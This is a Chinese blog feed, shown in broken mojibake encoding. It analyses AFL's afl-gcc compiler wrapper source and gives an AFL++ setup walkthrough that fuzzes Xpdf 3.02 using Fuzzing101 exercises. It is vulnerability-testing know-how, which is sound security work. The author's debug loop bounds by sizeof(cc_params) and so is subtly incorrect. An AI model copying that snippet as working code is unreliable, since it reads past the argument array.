find_as</h2><p>è¿™ä¸ªå‡½æ•°ç”¨æ¥å¯»æ‰¾<code>afl-as</code>çš„ä½ç½®ã€‚</p><ul><li>å®ƒé¦–å…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨AFL_PATHè¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œå¦‚æœå­˜åœ¨å°±èµ‹å€¼ç»™afl_pathï¼Œç„¶åæ£€æŸ¥<code>afl_path/as</code>è¿™ä¸ªæ–‡ä»¶æ˜¯å¦å¯ä»¥æ‰§è¡Œï¼Œå¦‚æœå¯ä»¥æ‰§è¡Œï¼Œå°±å°†afl_pathè®¾ç½®ä¸ºas_pathã€‚</li><li>å¦‚æœä¸å­˜åœ¨AFL_PATHè¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œåˆ™æ£€æŸ¥argv0ï¼Œä¾‹å¦‚ï¼ˆâ€~/AFL/afl-gccâ€ï¼‰ä¸­æ˜¯å¦å­˜åœ¨â€™/â€˜ï¼Œå¦‚æœæœ‰å°±æ‰¾åˆ°æœ€åä¸€ä¸ªâ€™/â€˜æ‰€åœ¨çš„ä½ç½®ï¼Œå¹¶å–å…¶å‰é¢çš„å­—ç¬¦ä¸²ä½œä¸ºdirï¼Œç„¶åæ£€æŸ¥<code>dir/afl-as</code>è¿™ä¸ªæ–‡ä»¶æ˜¯å¦å¯ä»¥æ‰§è¡Œï¼Œå¦‚æœå¯ä»¥è®¿é—®ï¼Œå°±å°†dirè®¾ç½®ä¸ºas_path</li><li>å¦‚æœä¸Šè¿°ä¸¤ç§æ–¹å¼éƒ½å¤±è´¥ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</li></ul><h2 id="edit_params"><a class="markdownIt-Anchor" href="#edit_params"></a> edit_params</h2><p>è¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯å°†argvæ‹·è´åˆ°<code>u8 **cc_params</code>ä¸­ï¼Œå¹¶åšå¿…è¦çš„ç¼–è¾‘ã€‚</p><ul><li>å®ƒé¦–å…ˆé€šè¿‡ck_allocæ¥ä¸ºcc_paramsåˆ†é…å†…å­˜ï¼Œåˆ†é…çš„é•¿åº¦ä¸º<code>(argc+128)*8</code>ï¼Œç›¸å½“å¤§çš„å†…å­˜äº†ã€‚</li><li>ç„¶åæ£€æŸ¥argv[0]é‡Œæœ‰æ²¡æœ‰â€™/â€˜ï¼Œå¦‚æœæ²¡æœ‰å°±èµ‹å€¼â€™argv[0]â€™åˆ°nameï¼Œå¦‚æœæœ‰å°±æ‰¾åˆ°æœ€åä¸€ä¸ªâ€™/â€˜æ‰€åœ¨çš„ä½ç½®ï¼Œç„¶åè·³è¿‡è¿™ä¸ªâ€™/â€˜ï¼Œä½¿nameæŒ‡å‘â€™/'åé¢çš„å€¼ã€‚</li><li>å°†nameå’Œafl-clangæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒï¼Œ<ul><li>åˆ™è®¾ç½®clang_modeä¸º1ï¼Œç„¶åè®¾ç½®ç¯å¢ƒå˜é‡CLANG_ENV_VARä¸º1ã€‚</li><li>ç„¶åå°†nameå’Œafl-clang++æ¯”è¾ƒ<ul><li>å¦‚æœç›¸åŒï¼Œåˆ™è·å–ç¯å¢ƒå˜é‡<code>AFL_CXX</code>çš„å€¼ï¼Œå¦‚æœè¯¥å€¼å­˜åœ¨ï¼Œåˆ™å°†cc_params[0]è®¾ç½®ä¸ºè¯¥å€¼ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°±è®¾ç½®ä¸ºclang++</li><li>å¦‚æœä¸ç›¸åŒï¼Œåˆ™è·å–ç¯å¢ƒå˜é‡<code>AFL_CC</code>çš„å€¼ï¼Œå¦‚æœè¯¥å€¼å­˜åœ¨ï¼Œåˆ™å°†cc_params[0]è®¾ç½®ä¸ºè¯¥å€¼ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°±è®¾ç½®ä¸ºclang</li></ul></li></ul></li><li>å¦‚æœä¸ç›¸åŒï¼Œåˆ™å°†nameå’Œafl-g++æ¯”è¾ƒ<ul><li>å¦‚æœç›¸åŒï¼Œåˆ™è·å–ç¯å¢ƒå˜é‡<code>AFL_CXX</code>çš„å€¼ï¼Œå¦‚æœè¯¥å€¼å­˜åœ¨ï¼Œåˆ™å°†cc_params[0]è®¾ç½®ä¸ºè¯¥å€¼ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°±è®¾ç½®ä¸ºg++</li><li>è¿˜æ¯”äº†ä¸‹gcjï¼Œä¸€èˆ¬ç”¨ä¸åˆ°</li><li>å¦‚æœä¸ç›¸åŒï¼Œåˆ™è·å–ç¯å¢ƒå˜é‡<code>AFL_CC</code>çš„å€¼ï¼Œå¦‚æœè¯¥å€¼å­˜åœ¨ï¼Œåˆ™å°†cc_params[0]è®¾ç½®ä¸ºè¯¥å€¼ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°±è®¾ç½®ä¸ºgcc</li></ul></li><li>ç„¶åéå†ä»argv[1]å¼€å§‹çš„argvå‚æ•°<ul><li>è·³è¿‡<code>-B/integrated-as/-pipe</code></li><li>å¦‚æœå­˜åœ¨<code>-fsanitize=address</code>æˆ–è€…<code>-fsanitize=memory</code>ï¼Œå°±è®¾ç½®asan_setä¸º1;</li><li>å¦‚æœå­˜åœ¨<code>FORTIFY_SOURCE</code>ï¼Œåˆ™è®¾ç½®fortify_setä¸º1</li><li><code>cc_params[cc_par_cnt++] = cur</code>;</li></ul></li><li>ç„¶åå¼€å§‹è®¾ç½®å…¶ä»–çš„cc_paramså‚æ•°<ul><li>å–ä¹‹å‰è®¡ç®—å‡ºæ¥çš„<code>as_path</code>ï¼Œç„¶åè®¾ç½®<code>-B as_path</code></li><li>å¦‚æœæ˜¯clang_mode,åˆ™è®¾ç½®<code>-no-integrated-as</code></li><li>å¦‚æœå­˜åœ¨AFL_HARDENç¯å¢ƒå˜é‡ï¼Œåˆ™è®¾ç½®<code>-fstack-protector-all</code></li><li>sanitizer<ul><li>ifå¦‚æœasan_setåœ¨ä¸Šé¢è¢«è®¾ç½®ä¸º1ï¼Œåˆ™ä½¿<code>AFL_USE_ASAN</code>ç¯å¢ƒå˜é‡ä¸º1</li><li>elseifå­˜åœ¨AFL_USE_ASANç¯å¢ƒå˜é‡ï¼Œåˆ™è®¾ç½®<code>-fsanitize=address</code></li><li>elseifå¦‚æœå­˜åœ¨AFL_USE_MSANç¯å¢ƒå˜é‡ï¼Œåˆ™è®¾ç½®<code>-fsanitize=memory</code>ï¼Œä½†ä¸èƒ½åŒæ—¶è¿˜æŒ‡å®š<code>AFL_HARDEN</code>æˆ–è€…<code>AFL_USE_ASAN</code>ï¼Œå› ä¸ºè¿™æ ·è¿è¡Œæ—¶é€Ÿåº¦è¿‡æ…¢ã€‚</li></ul></li><li>å¦‚æœä¸å­˜åœ¨AFL_DONT_OPTIMIZEç¯å¢ƒå˜é‡ï¼Œåˆ™è®¾ç½®<code>-g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</code></li><li>å¦‚æœå­˜åœ¨AFL_NO_BUILTINç¯å¢ƒå˜é‡ï¼Œåˆ™è®¾ç½®<code>-fno-builtin-strcmp</code>ç­‰</li></ul></li><li>æœ€å<code>cc_params[cc_par_cnt] = NULL;</code>ç»ˆæ­¢å¯¹cc_paramsçš„ç¼–è¾‘</li></ul><h2 id="mainå‡½æ•°"><a class="markdownIt-Anchor" href="#mainå‡½æ•°"></a> mainå‡½æ•°</h2><p>çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å°±çŸ¥é“afl-gccå°±æ˜¯æ‰¾åˆ°asæ‰€åœ¨çš„ä½ç½®ï¼Œå°†å…¶åŠ å…¥æœç´¢è·¯å¾„ï¼Œç„¶åè®¾ç½®å¿…è¦çš„gccå‚æ•°å’Œä¸€äº›å®ï¼Œç„¶åè°ƒç”¨gccè¿›è¡Œå®é™…çš„ç¼–è¯‘ï¼Œä»…ä»…åªæ˜¯ä¸€å±‚wrapper</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Main entry point */</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br><br>    <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">2</span>) &amp;&amp; !getenv(<span class="hljs-string">&quot;AFL_QUIET&quot;</span>)) &#123;<br><br>        SAYF(cCYA <span class="hljs-string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>    &#125; <span class="hljs-keyword">else</span> be_quiet = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>        ...<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">//æŸ¥æ‰¾fake GNU assembler</span><br>    find_as(argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-comment">// è®¾ç½®CCçš„å‚æ•°</span><br>    edit_params(argc, argv);<br>    <span class="hljs-comment">// è°ƒç”¨execvpæ¥æ‰§è¡ŒCC</span><br>    <br>    <span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬åœ¨CCä¹‹å‰æ‰“å°ä¸€ä¸‹å‚æ•°çœ‹çœ‹ã€‚</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(cc_params); i++) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\targ%d: %s &quot;</span>,i,cc_params[i]);<br>    &#125;<br><br>    execvp(cc_params[<span class="hljs-number">0</span>], (<span class="hljs-keyword">char</span> **) cc_params);<br><br>    FATAL(<span class="hljs-string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>é€šè¿‡åœ¨æ‰§è¡Œexecvpä¹‹å‰æ‰“å°å‘½ä»¤è¡Œå‚æ•°å¾—åˆ°</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span> /tmp/hello.c -B /root/src/afl-<span class="hljs-number">2</span>.<span class="hljs-number">52</span>b -g -O<span class="hljs-number">3</span> -funroll-loops -D__AFL_COMPILER=<span class="hljs-number">1</span> -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>afl-gcc</code>æœ€ç»ˆè°ƒç”¨<code>gcc</code>ï¼Œå¹¶å®šä¹‰äº†ä¸€äº›å®ï¼Œè®¾ç½®äº†ä¸€äº›å‚æ•°ã€‚å…¶ä¸­æœ€å…³é”®çš„å°±æ˜¯<code>-B /root/src/afl-2.52b</code>è¿™æ¡ã€‚æ ¹æ®<code>gcc --help</code>å¯çŸ¥ï¼Œ<code>-B</code>é€‰é¡¹ç”¨äºè®¾ç½®ç¼–è¯‘å™¨çš„æœç´¢è·¯å¾„ï¼Œè¿™é‡Œä¾¿æ˜¯è®¾ç½®æˆ<code>/root/src/afl-2.52b</code>(æ˜¯æˆ‘è®¾ç½®çš„ç¯å¢ƒå˜é‡<code>AFL_PATH</code>çš„å€¼ï¼Œå³AFLç›®å½•ï¼Œå› ä¸ºæˆ‘æ²¡æœ‰make install)ã€‚</p><p>å¦‚æœäº†è§£ç¼–è¯‘è¿‡ç¨‹ï¼Œé‚£ä¹ˆå°±çŸ¥é“æŠŠæºä»£ç ç¼–è¯‘æˆäºŒè¿›åˆ¶ï¼Œä¸»è¦æ˜¯ç»è¿‡â€æºä»£ç â€-&gt;â€æ±‡ç¼–ä»£ç â€-&gt;â€äºŒè¿›åˆ¶â€è¿™æ ·çš„è¿‡ç¨‹ã€‚è€Œå°†æ±‡ç¼–ä»£ç ç¼–è¯‘æˆä¸ºäºŒè¿›åˆ¶çš„å·¥å…·ï¼Œå³ä¸ºæ±‡ç¼–å™¨assemblerã€‚Linuxç³»ç»Ÿä¸‹çš„å¸¸ç”¨æ±‡ç¼–å™¨æ˜¯<code>as</code>ã€‚ä¸è¿‡ï¼Œç¼–è¯‘å®ŒæˆAFLåï¼Œåœ¨å…¶ç›®å½•ä¸‹ä¹Ÿä¼šå­˜åœ¨ä¸€ä¸ª<code>as</code>æ–‡ä»¶ï¼Œå¹¶ä½œä¸ºç¬¦å·é“¾æ¥æŒ‡å‘<code>afl-as</code>ã€‚æ‰€ä»¥ï¼Œå¦‚æœé€šè¿‡<code>-B</code>é€‰é¡¹ä¸ºgccè®¾ç½®äº†æœç´¢è·¯å¾„ï¼Œé‚£ä¹ˆ<code>afl-as</code>ä¾¿ä¼šä½œä¸ºæ±‡ç¼–å™¨ï¼Œæ‰§è¡Œå®é™…çš„æ±‡ç¼–æ“ä½œã€‚</p><p>æ‰€ä»¥ï¼ŒAFLçš„ä»£ç æ’æ¡©ï¼Œå°±æ˜¯åœ¨å°†æºæ–‡ä»¶ç¼–è¯‘ä¸ºæ±‡ç¼–ä»£ç åï¼Œé€šè¿‡<code>afl-as</code>å®Œæˆã€‚</p>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFLå®‰è£…åŠç®€å•å®è·µ</title>
    <link href="/posts/22ae87fa/"/>
    <url>/posts/22ae87fa/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€-aflç®€ä»‹"><a class="markdownIt-Anchor" href="#ä¸€-aflç®€ä»‹"></a> ä¸€ã€AFLç®€ä»‹</h1><p>AFLï¼ˆAmerican Fuzzy Lopï¼‰æ˜¯ç”±å®‰å…¨ç ”ç©¶å‘˜Micha Zalewskiï¼ˆ<a href="https://twitter.com/lcamtuf">@lcamtuf</a>ï¼‰å¼€å‘çš„ä¸€æ¬¾åŸºäºè¦†ç›–å¼•å¯¼ï¼ˆCoverage-guidedï¼‰çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œå®ƒé€šè¿‡è®°å½•è¾“å…¥æ ·æœ¬çš„ä»£ç è¦†ç›–ç‡ï¼Œä»è€Œè°ƒæ•´è¾“å…¥æ ·æœ¬ä»¥æé«˜è¦†ç›–ç‡ï¼Œå¢åŠ å‘ç°æ¼æ´çš„æ¦‚ç‡ã€‚</p><p>â‘ ä»æºç ç¼–è¯‘ç¨‹åºæ—¶è¿›è¡Œæ’æ¡©ï¼Œä»¥è®°å½•ä»£ç è¦†ç›–ç‡ï¼ˆCode Coverageï¼‰ï¼›</p><p>â‘¡é€‰æ‹©ä¸€äº›è¾“å…¥æ–‡ä»¶ï¼Œä½œä¸ºåˆå§‹æµ‹è¯•é›†åŠ å…¥è¾“å…¥é˜Ÿåˆ—ï¼ˆqueueï¼‰ï¼›</p><p>â‘¢å°†é˜Ÿåˆ—ä¸­çš„æ–‡ä»¶æŒ‰ä¸€å®šçš„ç­–ç•¥è¿›è¡Œâ€œçªå˜â€ï¼›</p><p>â‘£å¦‚æœç»è¿‡å˜å¼‚æ–‡ä»¶æ›´æ–°äº†è¦†ç›–èŒƒå›´ï¼Œåˆ™å°†å…¶ä¿ç•™æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­;</p><p>â‘¤ä¸Šè¿°è¿‡ç¨‹ä¼šä¸€ç›´å¾ªç¯è¿›è¡Œï¼ŒæœŸé—´è§¦å‘äº†crashçš„æ–‡ä»¶ä¼šè¢«è®°å½•ä¸‹æ¥ã€‚</p><p><img src="/posts/22ae87fa/image-20211201143448119.png" alt="image-20211201143448119"></p><h1 id="äºŒ-aflç®€å•æµ‹è¯•"><a class="markdownIt-Anchor" href="#äºŒ-aflç®€å•æµ‹è¯•"></a> äºŒã€AFLç®€å•æµ‹è¯•</h1><p>è¿™éƒ¨åˆ†é‡‡ç”¨<a href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%201">fuzzing101</a>æä¾›çš„ç»ƒä¹ è¿›è¡Œå¿«é€Ÿç†Ÿæ‚‰AFLçš„åŸºæœ¬æ“ä½œ</p><h2 id="è·å–fuzzç›®æ ‡"><a class="markdownIt-Anchor" href="#è·å–fuzzç›®æ ‡"></a> è·å–fuzzç›®æ ‡</h2><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ç”¨æ¥å­˜æ”¾fuzzç›®æ ‡ï¼ˆxpdf)</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">cd</span> <span class="hljs-variable">$HOME</span><br><span class="hljs-keyword">mkdir</span> fuzzing_xpdf &amp;&amp; <span class="hljs-keyword">cd</span> fuzzing_xpdf/<br></code></pre></div></td></tr></table></figure><p>å®‰è£…å¼€å‘å¿…è¦çš„è½¯ä»¶åŒ…ï¼Œbuild-essentialåŒ…å«gccã€g++ç­‰å¼€å‘å¿…è¦çš„åŒ…</p><blockquote><p>å…·ä½“åŒ…æ‹¬</p><p>dpkg-dev fakeroot g++ g+Â±4.6 libalgorithm-diff-perl<br>libalgorithm-diff-xs-perl libalgorithm-merge-perl<br>libdpkg-perl libstdc++6-4.6-dev libtimedate-perl</p></blockquote><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> build-essential<br></code></pre></div></td></tr></table></figure><p>ä¸‹è½½Xpdf 3.02:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://dl.xpdfreader.com/old/xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br><span class="hljs-attribute">tar</span> -xvzf xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br></code></pre></div></td></tr></table></figure><p>Build Xpdf:</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> xpdf-<span class="hljs-number">3.02</span><br>sudo apt <span class="hljs-keyword">update</span> &amp;&amp; sudo apt install -<span class="hljs-keyword">y</span> build-essential gcc<br>./configure --prefix=<span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></div></td></tr></table></figure><blockquote><p>./configure make make install <a href>å…·ä½“è§£é‡Šå¯è§</a></p></blockquote><p>ä¸ºäº†æµ‹è¯•ï¼Œå…ˆä¸‹è½½æµ‹è¯•æ ·ä¾‹</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span>/fuzzing_xpdf<br>mkdir pdf_examples &amp;&amp; cd pdf_examples<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mozilla/</span>pdf.js-sample-files<span class="hljs-regexp">/raw/m</span>aster/helloworld.pdf<br>wget http:<span class="hljs-regexp">//</span>www.africau.edu<span class="hljs-regexp">/images/</span>default/sample.pdf<br>wget https:<span class="hljs-regexp">//</span>www.melbpc.org.au<span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/2017/</span><span class="hljs-number">10</span>/small-example-pdf-file.pdf<br></code></pre></div></td></tr></table></figure><p>æµ‹è¯•pdfinfoäºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdfinfo -box -meta <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples/helloworld.pdf<br></code></pre></div></td></tr></table></figure><p>You should see something like this:</p><h2 id="å®‰è£…afl"><a class="markdownIt-Anchor" href="#å®‰è£…afl"></a> å®‰è£…AFL++</h2><p>å®‰è£…å¿…è¦çš„ä¾èµ–</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.<span class="hljs-number">0</span>-dev libpixman-<span class="hljs-number">1</span>-dev python3-setuptools<br>sudo apt-get install -y lld-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span>-dev clang-<span class="hljs-number">11</span><span class="hljs-operator"> || </span>sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-plugin-dev libstdc++-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-dev<br></code></pre></div></td></tr></table></figure><p>è·å–å’Œæ„å»ºAFL++</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> $HOME<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-keyword">cd</span> AFLplusplus<br>export LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-keyword">make</span> distrib-<br>sudo <span class="hljs-keyword">make</span> install<br></code></pre></div></td></tr></table></figure><p>é€šè¿‡è¾“å…¥ä¸‹é¢çš„å‘½ä»¤å¯ä»¥æŸ¥çœ‹afl-fuzzçš„å…·ä½“å‘½ä»¤å‚æ•°</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">afl-fuzz</span><br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°</p><p><img src="/posts/22ae87fa/image-20211201204851442.png" alt="image-20211201204851442"></p><h3 id="afl-fuzzå‘½ä»¤æ ¼å¼"><a class="markdownIt-Anchor" href="#afl-fuzzå‘½ä»¤æ ¼å¼"></a> <strong>afl-fuzzå‘½ä»¤æ ¼å¼</strong></h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">afl-fuzz -i testcase_dir -o findings_dir -- <span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/tested/</span>program [...program<span class="hljs-string">&#x27;s cmdline...]</span><br></code></pre></div></td></tr></table></figure><p>ç”¨@@ä¼šè‡ªåŠ¨æ›¿æ¢ä¸ºè¾“å…¥æ–‡ä»¶å</p><h3 id="afl-fuzz-åŸºæœ¬å‚æ•°è¯´æ˜"><a class="markdownIt-Anchor" href="#afl-fuzz-åŸºæœ¬å‚æ•°è¯´æ˜"></a> <strong>afl-fuzz åŸºæœ¬å‚æ•°è¯´æ˜ï¼š</strong></h3><ul><li><p>-iï¼šæŒ‡å®šæµ‹è¯•æ ·æœ¬æ‰€åœ¨ç›®å½•ï¼›</p></li><li><p>-oï¼šæŒ‡å®šæµ‹è¯•ç»“æœå­˜æ”¾ç›®å½•ï¼›</p></li><li><p>-Mï¼šè¿è¡Œä¸»(Master) Fuzzerï¼›</p></li><li><p>-Sï¼šè¿è¡Œä»å±(Slave) Fuzzerï¼›</p></li><li><p>-tï¼šè®¾ç½®ç¨‹åºè¿è¡Œè¶…æ—¶å€¼ï¼Œå•ä½ä¸º msï¼›</p></li><li><p>-mï¼šæœ€å¤§è¿è¡Œå†…å­˜ï¼Œå•ä½ä¸º MBï¼›</p></li><li><p>-sï¼š è¡¨ç¤ºè¦ä½¿ç”¨çš„é™æ€éšæœºç§å­</p></li><li><p>@@ å ä½ç¬¦ï¼ŒAFL å°†ç”¨æ¯ä¸ªè¾“å…¥æ–‡ä»¶åæ›¿æ¢å®ƒ</p></li></ul><p>æ›´å¤šå‚æ•°ä¿¡æ¯å¯é€šè¿‡å‘½ä»¤<code>afl-fuzz</code>æ¥å¾—çŸ¥</p><h2 id="å¼€å§‹fuzzing"><a class="markdownIt-Anchor" href="#å¼€å§‹fuzzing"></a> å¼€å§‹fuzzing</h2><p>å‰é¢è¯´åˆ°ï¼ŒAFLä»æºç ç¼–è¯‘ç¨‹åºæ—¶è¿›è¡Œæ’æ¡©ï¼Œä»¥è®°å½•ä»£ç è¦†ç›–ç‡ã€‚è¿™ä¸ªå·¥ä½œéœ€è¦ä½¿ç”¨å…¶æä¾›çš„ä¸¤ç§ç¼–è¯‘å™¨çš„wrapperç¼–è¯‘ç›®æ ‡ç¨‹åºï¼Œå’Œæ™®é€šçš„ç¼–è¯‘è¿‡ç¨‹æ²¡æœ‰å¤ªå¤§åŒºåˆ«</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¸…ç†æ‰€æœ‰ä»¥å‰ç¼–è¯‘çš„ç›®æ ‡æ–‡ä»¶å’Œå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">rm -r <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<br>cd <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>xpdf-<span class="hljs-number">3.02</span>/<br>make clean<br></code></pre></div></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å¼€å§‹ç”¨<strong>afl-clang-fast</strong> ç”¨ç¼–è¯‘xpdf:</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast <span 